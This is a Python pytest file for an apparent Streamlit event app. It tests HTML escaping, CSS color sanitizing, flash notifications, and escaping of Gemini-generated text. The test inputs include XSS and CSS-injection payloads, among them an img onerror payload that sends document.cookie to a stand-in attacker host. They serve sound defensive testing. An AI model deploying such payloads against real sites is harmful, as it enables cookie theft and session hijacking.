"""Tests for security validation, XSS prevention, and notification reliability."""

import html
import pytest
from unittest.mock import MagicMock, patch

from services.security import (
    escape_text,
    get_and_clear_notifications,
    is_safe_css_color,
    is_valid_hex_color,
    sanitize_css_color,
    set_notification,
)


# ---------------------------------------------------------------------------
# 1. HTML Escaping Tests (XSS Prevention)
# ---------------------------------------------------------------------------

def test_escape_text_basic():
    """Verify clean strings pass through with expected escaping."""
    assert escape_text("Simple Event Name") == "Simple Event Name"
    assert escape_text("") == ""
    assert escape_text(None) == ""
    assert escape_text(12345) == "12345"
    assert escape_text(99.95) == "99.95"


def test_escape_text_script_tag_injection():
    """Verify script tags are escaped into benign HTML entities."""
    payload = "<script>alert('pwned')</script>"
    escaped = escape_text(payload)
    assert "<script>" not in escaped
    assert "</script>" not in escaped
    assert "&lt;script&gt;alert(&#x27;pwned&#x27;)&lt;/script&gt;" == escaped


def test_escape_text_attribute_breaking():
    """Verify quote characters and event handlers are neutralized."""
    payload = '" onfocus="alert(document.cookie)"'
    escaped = escape_text(payload)
    assert '"' not in escaped
    assert "&quot;" in escaped
    assert "onfocus=" in escaped  # harmless as text content, not an active attribute


def test_escape_text_img_onerror_vector():
    """Verify image error vectors in user/AI inputs are sanitized."""
    payload = "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"
    escaped = escape_text(payload)
    assert "<img" not in escaped
    assert "&lt;img" in escaped
    assert "&gt;" in escaped


def test_escape_text_ampersands_and_brackets():
    """Verify ampersands and angle brackets are strictly escaped."""
    payload = "Smith & Wesson <VIP Lounge>"
    escaped = escape_text(payload)
    assert "&amp;" in escaped
    assert "&lt;VIP Lounge&gt;" in escaped
    assert "<" not in escaped
    assert ">" not in escaped


# ---------------------------------------------------------------------------
# 2. CSS Color Validation Tests (CSS Injection Prevention)
# ---------------------------------------------------------------------------

def test_is_valid_hex_color_valid():
    """Verify valid 3, 4, 6, and 8 digit hex colors pass."""
    assert is_valid_hex_color("#FFF") is True
    assert is_valid_hex_color("#fff") is True
    assert is_valid_hex_color("#6CB8A8") is True
    assert is_valid_hex_color("#C5A059") is True
    assert is_valid_hex_color("#120E18FF") is True
    assert is_valid_hex_color("#ABCD") is True


def test_is_valid_hex_color_invalid():
    """Verify non-hex colors or injection attempts fail hex check."""
    assert is_valid_hex_color("red") is False
    assert is_valid_hex_color("#GGGGGG") is False
    assert is_valid_hex_color("123456") is False  # missing #
    assert is_valid_hex_color("#12") is False  # too short
    assert is_valid_hex_color("#12345") is False  # 5 digits invalid
    assert is_valid_hex_color("#6CB8A8; background: red") is False
    assert is_valid_hex_color(None) is False
    assert is_valid_hex_color(12345) is False


def test_is_safe_css_color_valid():
    """Verify safe CSS colors (hex, rgb, rgba, safe named colors) pass."""
    assert is_safe_css_color("#6CB8A8") is True
    assert is_safe_css_color("#C5A059") is True
    assert is_safe_css_color("rgb(108, 184, 168)") is True
    assert is_safe_css_color("rgba(108, 184, 168, 0.5)") is True
    assert is_safe_css_color("gold") is True
    assert is_safe_css_color("teal") is True


def test_is_safe_css_color_injection_attacks():
    """Verify CSS injection attempts are detected and rejected."""
    # Semicolon stylesheet injection
    assert is_safe_css_color("#6CB8A8; background-image: url('http://evil.com')") is False
    # JavaScript expression injection
    assert is_safe_css_color("expression(alert(1))") is False
    # JavaScript protocol URL
    assert is_safe_css_color("url(javascript:alert(1))") is False
    # Bracket enclosure injection
    assert is_safe_css_color("red} body { display:none; }") is False
    # Tag escape injection
    assert is_safe_css_color("</style><script>alert(1)</script>") is False
    # Excessively long string
    assert is_safe_css_color("a" * 50) is False
    # Non-string types
    assert is_safe_css_color(None) is False
    assert is_safe_css_color([]) is False


def test_sanitize_css_color():
    """Verify sanitizer returns original color when safe, or default when malicious."""
    assert sanitize_css_color("#6CB8A8") == "#6CB8A8"
    assert sanitize_css_color("#F0B36C") == "#F0B36C"
    # Malicious inputs revert to safe default
    assert sanitize_css_color("#6CB8A8; background: red", default="#C5A059") == "#C5A059"
    assert sanitize_css_color("expression(alert(1))", default="#6CB8A8") == "#6CB8A8"
    assert sanitize_css_color("", default="#C5A059") == "#C5A059"
    assert sanitize_css_color(None, default="#C5A059") == "#C5A059"


# ---------------------------------------------------------------------------
# 3. Notification Reliability Tests (Flash Message Session State)
# ---------------------------------------------------------------------------

def test_notification_lifecycle_in_session_state():
    """Verify notifications are queued, persisted, and drained on retrieval."""
    mock_session = {}

    with patch("streamlit.session_state", mock_session):
        # Initial state: empty
        assert get_and_clear_notifications() == []

        # Queue success message
        set_notification("Event created successfully!", level="success")
        assert len(mock_session["flash_notifications"]) == 1

        # Queue warning message
        set_notification("Budget limit exceeded.", level="warning")
        assert len(mock_session["flash_notifications"]) == 2

        # Retrieve and drain
        retrieved = get_and_clear_notifications()
        assert len(retrieved) == 2
        assert retrieved[0]["message"] == "Event created successfully!"
        assert retrieved[0]["level"] == "success"
        assert retrieved[1]["message"] == "Budget limit exceeded."
        assert retrieved[1]["level"] == "warning"

        # Subsequent retrieval must be empty (drain semantics)
        assert get_and_clear_notifications() == []
        assert mock_session["flash_notifications"] == []


def test_notification_outside_streamlit_does_not_crash():
    """Verify set_notification / get_and_clear_notifications handle missing runtime gracefully."""
    # When streamlit cannot be imported or session_state is missing, functions must not raise
    with patch.dict("sys.modules", {"streamlit": None}):
        set_notification("Test message outside streamlit", level="info")
        result = get_and_clear_notifications()
        assert isinstance(result, list)


# ---------------------------------------------------------------------------
# 4. Gemini Output Sanitization & Untrusted Content Handling
# ---------------------------------------------------------------------------

def test_gemini_palette_chips_sanitization():
    """Verify Gemini color palette items containing malicious code are escaped."""
    malicious_palette = [
        "#C5A059",
        "<script>alert('xss')</script>",
        '" onmouseover="alert(1)',
        "#6CB8A8",
    ]
    rendered_chips = [f'<span class="palette-chip">{escape_text(c)}</span>' for c in malicious_palette]
    html_output = "".join(rendered_chips)

    assert "<script>" not in html_output
    assert "</script>" not in html_output
    assert "&lt;script&gt;" in html_output
    assert '&quot; onmouseover=&quot;' in html_output
    assert '<span class="palette-chip">#C5A059</span>' in html_output


def test_gemini_theme_description_sanitization():
    """Verify AI theme narrative is escaped before insertion into content-box."""
    malicious_description = "A grand ball with <b onclick=alert('steal')>royal</b> ambiance & fireworks."
    safe_desc = escape_text(malicious_description)
    content_box = f'<div class="content-box"><p>{safe_desc}</p></div>'

    assert "<b onclick" not in content_box
    assert "&lt;b onclick=alert(&#x27;steal&#x27;)&gt;royal&lt;/b&gt;" in content_box
    assert "&amp; fireworks." in content_box

